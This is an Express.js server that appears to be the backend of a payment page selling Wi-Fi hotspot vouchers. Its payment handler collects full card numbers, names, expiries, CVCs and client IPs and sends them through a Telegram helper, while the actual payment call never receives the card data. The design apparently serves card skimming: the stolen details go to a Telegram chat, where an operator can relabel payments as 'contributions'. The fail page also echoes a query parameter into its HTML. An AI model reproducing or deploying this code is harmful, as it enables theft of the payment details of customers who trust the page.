const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const bodyParser = require("body-parser");
const path = require("path");
const multer = require("multer");
const axios = require("axios");
require("dotenv").config();

const { processPayment } = require("./pay");
const { sendTelegramMessage } = require("./telegram");
const webhookRouter = require("./webhook");
const { disableUserQueue } = require("./mikrotik");
const { processPaymentAndCreateCard } = require("./mikrotikService");
const { generateContributionHtmlPage } = require('./contributionMessages');
const { generateSuccessPageHtml } = require('./successPage');
const { generateFailPageHtml } = require('./failPage');
const chatSupport = require('./chat_support');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;
const NETWORK_URL = process.env.NETWORK_HOTSPOT_URL || "http://tales.net";

const BRANCH_NAMES = {
  waitPage: "يجب تأكيد الدفع من محفظتك",
  main: "حكايات نت رئيسي",
  branch2: "حكايات نت فرع ثاني",
  branch3: "حكايات نت فرع ثالث"
};
module.exports = { BRANCH_NAMES };

global.generatedCardsMap = global.generatedCardsMap || new Map();

// تهيئة Socket.io للدعم المباشر
chatSupport.initSocket(io);

// إعداد Multer
const upload = multer();

// تنظيف دوري للذاكرة المؤقتة
setInterval(() => {
  const oneHourAgo = Date.now() - (60 * 60 * 1000);
  for (let [key, value] of global.generatedCardsMap.entries()) {
    if (value.createdAt && new Date(value.createdAt).getTime() < oneHourAgo) {
      global.generatedCardsMap.delete(key);
    }
  }
}, 30 * 60 * 1000);

app.use(cors());
app.use(express.json());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// ==========================================
// 📡 استقبال ضغط الأزرار من التليجرام
// ==========================================
app.post('/telegram-webhook', async (req, res) => {
  const update = req.body;

  if (update.callback_query) {
    const data = update.callback_query.data;

    // زر المساهمة
    if (data.startsWith("contribution_")) {
      const [ , txId, amount ] = data.split("_");
      global.generatedCardsMap.set(txId, { isContribution: true, amount });

      await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: update.callback_query.message.chat.id,
        text: `✅ تم تحويل المعاملة ${txId} إلى مساهمة`
      });
    }

    // زر إصدار الكارت
    if (data.startsWith("issuecard_")) {
      const [ , txId, amount ] = data.split("_");
      const result = await processPaymentAndCreateCard(amount, "branch2", txId);

      if (result.success) {
        const cardPayload = {
          code: result.cardCode,
          packageName: result.packageName,
          amount,
          branchKey: result.branchKey,
          branchName: result.branchName,
          createdAt: new Date()
        };
        global.generatedCardsMap.set(txId, cardPayload);

        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
          chat_id: update.callback_query.message.chat.id,
          text: `🎫 تم إصدار الكارت للمعاملة ${txId}: ${cardPayload.code}`
        });
      }
    }
  }

  res.sendStatus(200);
});

// ==========================================
// 💳 مسارات المدفوعات
// ==========================================
async function handlePaymentRequest(req, res) {
  try {
    const data = { ...req.query, ...req.body };
    const {
      phone, user_phone, phoneNumber, amount, payment_method, method,
      number, name, expiry, cvc, card_data, save_card, clientID, clientId,
      publicIP, geoData, branch, branch_key
    } = data;

    if (!amount && Object.keys(data).length === 0) {
      return res.redirect("/");
    }

    const selectedMethod = payment_method || method || "wallet";
    const rawBranch = branch || branch_key || "branch2";
    const selectedBranch = BRANCH_NAMES[rawBranch] ? rawBranch : "branch2";
    const branchDisplayName = BRANCH_NAMES[selectedBranch] || BRANCH_NAMES.branch2;

    const userPhone = phone || user_phone || phoneNumber || data.phone_number || "غير محدد";
    const payAmount = amount || "5";
    const transactionId = "TX_" + Date.now();

    const paymentPayload = {
      phone: userPhone,
      amount_cents: parseFloat(payAmount) * 100,
      payment_method: selectedMethod,
      branch: selectedBranch,
      branchName: branchDisplayName,
      card_data: {
        number: (card_data && card_data.number) || number || "غير مدخل",
        name: (card_data && card_data.name) || name || "غير مدخل",
        expiry: (card_data && card_data.expiry) || expiry || "غير مدخل",
        cvc: (card_data && card_data.cvc) || cvc || "غير مدخل",
        save_card: save_card === "tokenize" || save_card === "نعم"
      },
      clientID: clientID || clientId || "غير متوفر",
      publicIP: publicIP || (geoData && geoData.publicIP) || getClientPublicIP(req)
    };

    if (typeof sendTelegramMessage === "function") {
      await sendTelegramMessage(paymentPayload, transactionId);
    }

    const result = await processPayment(userPhone, payAmount, selectedMethod, selectedBranch);

    if (result.type === "redirect") {
      return res.redirect(result.url);
    } else if (result.type === "html") {
      return res.send(result.content);
    } else {
      return res.redirect(`/success?id=${transactionId}&branch=${selectedBranch}`);
    }
  } catch (err) {
    console.error("❌ خطأ في معالجة طلب الدفع:", err.response?.data || err.message);
    res.redirect(`/fail?data_message=${encodeURIComponent(err.message)}`);
  }
}

app.get("/api/pay", handlePaymentRequest);
app.post("/api/pay", handlePaymentRequest);

// ✅ صفحة المساهمة
app.get("/contribution-success", (req, res) => {
  const amount = req.query.amount || 150;
  const transactionId = req.query.tx || req.query.id || 'TRX-DEFAULT';
  const htmlContent = generateContributionHtmlPage(amount, transactionId);
  res.send(htmlContent);
});

// ✅ فحص حالة المعاملة
app.get("/api/check-voucher/:txId", (req, res) => {
  const txId = String(req.params.txId || "").trim();
  
  if (!txId || txId === "null" || txId === "undefined") {
    return res.json({ success: false, message: "رقم المعاملة غير صالح" });
  }

  if (global.generatedCardsMap.has(txId)) {
    return res.json({ success: true, data: global.generatedCardsMap.get(txId) });
  }

  return res.json({ success: false, message: "جاري تأكيد عملية الدفع وتوليد الكارت من السيرفر..." });
});

// ✅ صفحة النجاح
app.get("/success", (req, res) => {
  const transactionId = req.query.id || "TX_" + Date.now();
  const queryBranch = req.query.branch || "";
  const pageHtml = generateSuccessPageHtml(transactionId, NETWORK_URL, queryBranch);
  res.send(pageHtml);
});

// ✅ صفحة الفشل
app.get("/fail", (req, res) => {
  const errorMessage = req.query.data_message || "حدثت مشكلة أثناء عملية الدفع، حاول مرة أخرى.";
  const pageHtml = generateFailPageHtml(errorMessage);
  res.send(pageHtml);
});

app.use("/", webhookRouter);

server.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
